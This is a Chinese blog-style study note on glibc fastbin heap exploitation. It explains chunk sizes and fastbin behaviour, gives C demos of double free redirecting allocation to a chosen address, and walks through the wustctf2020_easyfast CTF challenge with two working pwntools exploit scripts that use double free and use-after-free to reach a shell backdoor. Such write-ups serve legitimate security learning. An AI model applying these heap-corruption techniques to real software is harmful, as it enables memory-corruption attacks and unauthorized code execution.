---
title: fastbin
date: 2022-03-24 15:51:52
tags:
    - 堆
    - pwn
---

<!--more-->

# fastbin学习

## 复习堆块分类

普通堆块有三种分类：fastchunk、smallchunk、largechunk。

**fastchunk**:大小在0x20-0x80，用完之后回归fastbin

**smallchunk**:大小在0x20-0x400，经过unsorted bin 后，时机合适放入smallbin，与fastchunk有重合的部分（0x20-0x80），其中0x80-0x400可以直接放入smallbin，但是因为fastchunk容易产生碎片，所以重合的部分有自己专门的合并机制最后也会到smallbin里。

**largechunk**：大于0x400字节，释放后等时机合适会放入largebin

还有一个**top chunk**：顾名思义，是堆中第一个堆块。简单点说，也就是在程序在向堆管理器申请内存时，**没有合适的内存空间可以分配给他，此时就会从 top chunk 上”剪切”一部分作为 chunk 分配给他**

**所有申请的堆块大小都会被转化为16进制的一个整数。**

```
例如malloc(1)，通过malloc我们会返回一个字节的空间，但是系统会默认返回给我们0x20字节大小的空间，其中前0x10字节存放chunk的头部（size+prev_size），后0x10字节存放fd和bk。
同理，当申请malloc(0x21)，系统会申请0x30大小的字节堆块，前0x10字节存放chunk的头部，fd开始是用户可以写入的内容，占据0x20字节
```



## fastbin特性

**1.使用单链表来维护释放的堆块**

从main_arena 到 free 第一个块的地方是采用单链表形式进行存储的，若还有 free 掉的堆块，则这个堆块的 fk 指针域就会指针前一个堆块。

**2.采用后进先出的方式维护链表（类似于栈的结构）**

当程序需要重新 malloc 内存并且需要从fastbin 中挑选堆块时，**会选择后面新加入的堆块拿来先进行内存分配**

![image-20220324221049002](https://s2.loli.net/2022/03/26/PezKtYlXbxRk6rE.png)

相同大小的chunk，被free会被添加到同一链表中，后释放的堆块被对应的fastbin指向

![image-20220326163649069](https://s2.loli.net/2022/03/27/EFDYxsyI8midAZh.png)

**fastbin不会对free chunk进行合并操作**。鉴于设计**fast bin的初衷就是进行快速的小内存分配和释放，因此系统将属于fast bin的chunk的P(未使用标志位)总是设置为1（allocated）**，这样即使当fast bin中有某个chunk同一个free chunk相邻的时候，系统也不会进行自动合并操作，而是保留两者。虽然这样做可能会造成额外的碎片化问题，但瑕不掩瑜。

## fastbin攻击方法分类

> ```
> Fastbin Double Free
> House of Spirit
> Alloc to Stack
> Arbitrary Alloc
> ```
>
> **漏洞原因**：fastbin通过单链表连接，修改其fd值控制下一个申请的地址
>
> 条件：size位与fastbin对应

### double free原理

举例：

```
#include<stdio.h>
#include<malloc.h>
int main(){
	malloc(1);
	void *p,*q;
	p=malloc(0x10);
	q=malloc(0x10);
	free(p);
	free(q);
	free(p);
	
	return 0;
}
```

![image-20220326172800390](https://s2.loli.net/2022/03/27/BkUbmgCTjzVN2vJ.png)

double free制造了一个循环

### double free利用

```
#include<stdio.h>
#include<malloc.h>
unsigned long long data[1024];//目标地址
int main(){
	malloc(1);
	void *p,*q;
	p=malloc(0x10);
	q=malloc(0x10);
	free(p);
	free(q);
	free(p);
	void *l=malloc(0x10);	//占用的是最后一次释放的p堆块
	*(unsigned long long *)l=data;
	data[0]=0;//给堆块的pre_size赋值
	data[1]=0x21;//给堆块的size位赋值
	malloc(0x10);	//占用释放的q堆块
	malloc(0x10);	//占用最早释放的p堆块
	void *target=malloc(0x10);//target是用户可随意控制的命令
	printf("%p %p",data,target);
	
	return 0;
}
```

![image-20220326180425774](https://s2.loli.net/2022/03/27/8IEHV6UPFXJjZDu.png)

#### 注意

**至于为什么给data前两个数组赋值，因为系统会检查目的地的堆块size是否与我们即将要分配的size是否是一致的，data[0]是prev_size大小，其实多少都可以，因为fastbin不使用它，data[1]是size大小，我们即将要分配的0x10，但是系统实际会分配0x20，所以我们要赋值0x21，最末尾的1是fastbin特性标志位，不占大小，只起标志的作用（实际使用fastbin要构造特定大小）**

### 例题wustctf2020_easyfast

![image-20220327095708938](https://s2.loli.net/2022/03/27/jy9GuSetnNWkfJa.png)

菜单题，漏洞主要出现在free函数上

```
unsigned __int64 free_0()
{
  __int64 v1; // [rsp+8h] [rbp-28h]
  char s[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v3; // [rsp+28h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  puts("index>");
  fgets(s, 8, stdin);
  v1 = atoi(s);
  free(*(&buf + v1));//这里free没有检查之前有没有free过，可以造成double  free,其实也存在UAF
  return __readfsqword(0x28u) ^ v3;
}
```

### 思路

利用原理，先创造两个堆块0和1,然后先后释放堆块0、堆块1、堆块0，造成堆块0的double free，然后我们在申请一个堆块2，堆块2会先占用最后释放堆块0的位置，并且给堆块2赋值backdoor的地址，这样下次再使用堆块2（即堆块0）的时候就会在backdoor上填充内容，然后在申请堆块3，4分别填充前面释放的两次堆块的位置，当我们再次申请堆块5的时候，因为指针0的fd之前已经被我们修改为backdoor地址，所以堆块5会在backdoor上开辟一个堆，我们在这个堆上利用edit函数修改即修改backdoor上的内容为0即可通过后门拿到shell

### EXP：

```
# -*- coding: utf-8 -*-
from pwn import *
context.log_level='debug'
p=process('./wustctf2020_easyfast')
backdoor=0x00602090
target_addr=0x602080	#前0x10是prev_size和size位，并且fd->target
def add(size):
	p.sendlineafter("choice>",'1')
	p.sendlineafter("size>",str(size))
def delete(index):
	p.sendlineafter("choice>",'2')
	p.sendlineafter("index>",str(index))
def write(index,size):
	p.sendlineafter("choice>",'3')
	p.recvuntil("index>")
	p.sendline(str(index))
	p.sendline(str(size))
def backdoor():
	p.sendlineafter("choice>",'4')
add(0x40)	#0
add(0x40)	#1
delete(0)
delete(1)
delete(0)
add(0x40)	#2
write(2,p64(target_addr))
gdb.attach(p)
add(0x40)	#3
add(0x40)	#4
add(0x40)	#5
write(5,p64(0))
backdoor()

p.interactive()
#double free做法
```

```
from pwn import *

p=process('./wustctf2020_easyfast')
#p=remote("node4.buuoj.cn",29319)
context.log_level="debug"

def add(size):
	p.recvuntil('choice>')
	p.sendline('1')
	p.recvuntil('size>')
	p.sendline(str(size))
	

def delete(index):
	p.recvuntil('choice>')
	p.sendline('2')
	p.recvuntil('index>')
	p.sendline(str(index))

def edit(idx,content):
	p.sendlineafter('choice>','3')
	p.sendlineafter('index>',str(idx))
	p.send(content)

def backdoor():
	p.sendlineafter('choice>','4')

add(0x40)#0
add(0x40)#1
#gdb.attach(p)
delete(0)
#gdb.attach(p)
edit(0,p64(0x602080))
#gdb.attach(p)
add(0x40)#0
gdb.attach(p)
add(0x40)#3
edit(3,p64(0))
backdoor()
#gdb.attach(p)
p.interactive()
#UAF做法
```

